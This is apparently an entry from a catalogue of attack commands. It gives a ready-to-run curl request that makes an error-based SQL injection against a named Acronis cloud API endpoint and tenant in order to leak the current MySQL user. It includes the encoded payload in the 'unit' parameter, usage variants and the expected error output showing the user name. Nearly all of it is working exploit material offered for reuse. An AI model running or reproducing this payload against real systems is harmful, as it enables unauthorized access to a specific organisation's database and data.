---
id: 123e4567-e89b-12d3-a456-426614174004
name: curl-sqli-user-leak
type: command
executor: bash
data: >-
  curl -X GET
  "https://mc-beta-cloud.acronis.com/api/agent_manager/v2/unit_configurations?name=update-schedule&no_data=false&tenant_id=1590228&unit=atp-agent'%20and%2F%2A%2A%2Fextractvalue(1,concat(char(126),(select%20user())))%20and'%20"
  -v
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:10.129Z'
platforms:
  - Linux
  - macOS
  - Windows
tags:
  - sqli
  - exploitation
verified: false
validated: true
submitted: true
---

# curl-sqli-user-leak

## Command

```bash
curl -X GET "https://mc-beta-cloud.acronis.com/api/agent_manager/v2/unit_configurations?name=update-schedule&no_data=false&tenant_id=1590228&unit=atp-agent'%20and%2F%2A%2A%2Fextractvalue(1,concat(char(126),(select%20user())))%20and'%20" -v
```

## Description

This command exploits SQLi to leak the current MySQL user through an extractvalue-induced error in the Acronis API.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | HTTP GET method | Yes |
| URL params | Injected payload in 'unit' | Yes |
| `-v` | Verbose mode | No |

## Examples

### Basic Usage

```bash
curl -X GET "https://target.com/api/agent_manager/v2/unit_configurations?..." -v
```

### Advanced Usage

With timeout:

```bash
curl -X GET --max-time 30 "https://target.com/api/..." -v
```

## Expected Output

Error response with user info, e.g., "XPATH syntax error: '~dbuser@localhost'".

## Related

- [[Related Procedure: Error-Based-SQL-Injection-to-Leak-Current-User]]
